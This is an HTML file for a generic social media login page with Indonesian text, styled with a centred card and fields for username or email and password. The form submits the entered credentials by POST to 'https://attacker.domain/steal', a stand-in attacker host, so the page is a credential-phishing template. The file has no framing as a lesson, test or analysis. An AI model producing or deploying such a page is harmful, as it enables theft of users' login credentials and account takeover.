<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Login Media Sosial</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .login-container {
      background: white;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
      text-align: center;
    }
    .login-container h2 {
      margin-bottom: 1rem;
    }
    .login-container input {
      width: 100%;
      padding: 0.75rem;
      margin: 0.5rem 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .login-container button {
      width: 100%;
      padding: 0.75rem;
      background: #4285f4;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 1rem;
    }
    .login-container button:hover {
      background: #357ae8;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Masuk ke Media Sosial</h2>
    <form method="POST" action="https://attacker.domain/steal">
      <input type="text" name="username" placeholder="Username atau Email" required>
      <input type="password" name="password" placeholder="Kata Sandi" required>
      <button type="submit">Masuk</button>
    </form>
  </div>
</body>
</html>
